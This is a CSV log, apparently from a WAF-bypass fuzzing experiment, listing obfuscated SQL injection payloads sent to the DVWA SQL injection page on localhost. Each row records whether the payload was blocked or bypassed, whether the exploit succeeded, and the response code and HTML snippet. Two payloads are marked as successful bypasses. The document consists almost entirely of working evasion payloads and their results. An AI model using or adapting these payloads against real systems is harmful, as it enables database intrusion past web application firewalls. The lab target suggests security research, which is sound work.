Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=.1+or%0bnot%0b{`if`%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0149,69.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0bnot+{`if`+1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0201,70.0,No,500,
0'<@=1.+||+not+{a+1}=1=%0b(!~false)+||%27,Bypassed,No,None,Invalid,0.024,70.0,No,500,
0%27<@=1.+or+!+{a%0b1}=1=+(!+{x+(select+1)}=1)+,Blocked,No,None,Invalid,0.0192,70.04,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor+not%0btrue=+(0)%0b||%27,Bypassed,No,None,Invalid,0.0214,70.75,No,500,
0%27<@=1.+||%0b!%0b{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1,Blocked,No,None,Invalid,0.0276,71.04,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.+||+not%0b1=%0b(false)%0bor',Bypassed,No,None,Invalid,0.0393,71.13,No,500,
0%27<@=1+||+!~false=+(not+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0305,71.21,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0bnot%0btrue=%0b(not+{x+(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0408,71.21,No,500,
0'<@!=1.+||+!%7e0=+(!+1)+or%27,Blocked,No,None,Invalid,0.0275,71.21,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
